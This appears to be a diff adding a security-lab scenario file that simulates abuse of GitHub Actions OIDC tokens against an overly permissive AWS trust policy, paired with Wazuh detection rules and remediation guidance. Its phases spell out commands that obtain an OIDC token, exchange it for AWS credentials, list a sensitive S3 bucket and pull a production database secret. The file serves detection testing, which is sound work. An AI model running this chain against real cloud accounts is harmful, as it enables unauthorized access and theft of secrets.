@@ -1,0 +1,189 @@
+{
+  "id": "S3-03",
+  "name": "OIDC Token Abuse for Cloud Access",
+  "category": "CI/CD Pipeline",
+  "version": "1.0",
+  "description": "Abuse CI/CD OIDC tokens to gain unauthorized cloud access",
+  "difficulty": "Hard",
+  "real_world_relevance": "GitHub OIDC misconfiguration, overly permissive trust policies",
+
+  "mitre_attack": {
+    "tactics": ["Credential Access", "Lateral Movement"],
+    "techniques": [
+      {"id": "T1550.001", "name": "Use Alternate Authentication Material: Application Access Token"},
+      {"id": "T1078.004", "name": "Valid Accounts: Cloud Accounts"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["cicd-runner", "mock-cicd"],
+    "network": "cicd_net"
+  },
+
+  "attack_flow": {
+    "description": "Attacker abuses OIDC token with overly permissive cloud trust policy",
+    "diagram": [
+      "1. Attacker triggers CI workflow (via PR or push)",
+      "2. Workflow requests OIDC token from GitHub",
+      "3. Token claims allow access due to misconfigured trust policy",
+      "4. Attacker exchanges OIDC token for cloud credentials",
+      "5. Attacker accesses cloud resources with escalated privileges"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "OIDC Token Request",
+      "description": "Request OIDC token from CI/CD provider",
+      "actions": [
+        {
+          "type": "http_request",
+          "target": "http://172.42.0.100:8080/github/actions/oidc/token?audience=sts.amazonaws.com",
+          "method": "GET",
+          "expected_response_contains": ["value", "eyJ"]
+        }
+      ]
+    },
+    {
+      "name": "Token Analysis",
+      "description": "Decode and analyze OIDC token claims",
+      "actions": [
+        {
+          "type": "command",
+          "command": "echo $OIDC_TOKEN | cut -d'.' -f2 | base64 -d | jq",
+          "expected_output_contains": ["sub", "aud", "repository"]
+        }
+      ]
+    },
+    {
+      "name": "Cloud Credential Exchange",
+      "description": "Exchange OIDC token for cloud credentials",
+      "critical": true,
+      "actions": [
+        {
+          "type": "command",
+          "command": "aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789012:role/GitHubActionsRole --role-session-name ci-session --web-identity-token $OIDC_TOKEN",
+          "expected_output_contains": ["AccessKeyId", "SecretAccessKey"]
+        }
+      ]
+    },
+    {
+      "name": "Cloud Resource Access",
+      "description": "Access cloud resources with obtained credentials",
+      "actions": [
+        {
+          "type": "command",
+          "command": "aws s3 ls s3://sensitive-bucket/",
+          "description": "List sensitive S3 bucket"
+        },
+        {
+          "type": "command",
+          "command": "aws secretsmanager get-secret-value --secret-id production/database",
+          "description": "Retrieve secrets from Secrets Manager"
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "Network",
+      "description": "OIDC token request from unexpected workflow",
+      "wazuh_rule": "100806"
+    },
+    {
+      "type": "CloudTrail",
+      "description": "AssumeRoleWithWebIdentity from unexpected repo/workflow",
+      "wazuh_rule": "100807"
+    },
+    {
+      "type": "CloudTrail",
+      "description": "Sensitive API calls using OIDC-assumed credentials",
+      "wazuh_rule": "100808"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "100806",
+      "level": 8,
+      "description": "NHI: CI/CD OIDC token request detected"
+    },
+    {
+      "rule_id": "100807",
+      "level": 12,
+      "description": "NHI: Cloud role assumed via OIDC from unexpected source"
+    },
+    {
+      "rule_id": "100808",
+      "level": 14,
+      "description": "NHI: Sensitive cloud API call from CI/CD OIDC session"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Revoke sessions for affected IAM role",
+      "Review CloudTrail for unauthorized access",
+      "Update trust policy to restrict claims"
+    ],
+    "long_term": [
+      "Implement strict OIDC claim conditions",
+      "Restrict trust policy to specific repos and branches",
+      "Use environment protection rules in GitHub",
+      "Monitor OIDC token usage patterns"
+    ],
+    "secure_trust_policy": {
+      "Version": "2012-10-17",
+      "Statement": [
+        {
+          "Effect": "Allow",
+          "Principal": {
+            "Federated": "arn:aws:iam::ACCOUNT:oidc-provider/token.actions.githubusercontent.com"
+          },
+          "Action": "sts:AssumeRoleWithWebIdentity",
+          "Condition": {
+            "StringEquals": {
+              "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
+              "token.actions.githubusercontent.com:sub": "repo:myorg/myrepo:ref:refs/heads/main"
+            }
+          }
+        }
+      ]
+    },
+    "insecure_trust_policy_example": {
+      "comment": "INSECURE - allows any repo to assume role",
+      "Condition": {
+        "StringLike": {
+          "token.actions.githubusercontent.com:sub": "repo:*"
+        }
+      }
+    }
+  },
+
+  "demo_script": {
+    "container": "cicd-runner",
+    "commands": [
+      "# Request OIDC token",
+      "curl http://mock-cicd:8080/github/actions/oidc/token",
+      "",
+      "# Decode token claims (simulated)",
+      "echo 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJyZXBvOmRlbW8vdGVzdDpyZWY6cmVmcy9oZWFkcy9tYWluIn0' | cut -d'.' -f2 | base64 -d"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "GitHub OIDC Documentation",
+      "url": "https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect"
+    },
+    {
+      "title": "AWS OIDC Identity Provider",
+      "url": "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_providers_create_oidc.html"
+    },
+    {
+      "title": "OIDC Trust Policy Security",
+      "url": "https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services"
+    }
+  ]
+}
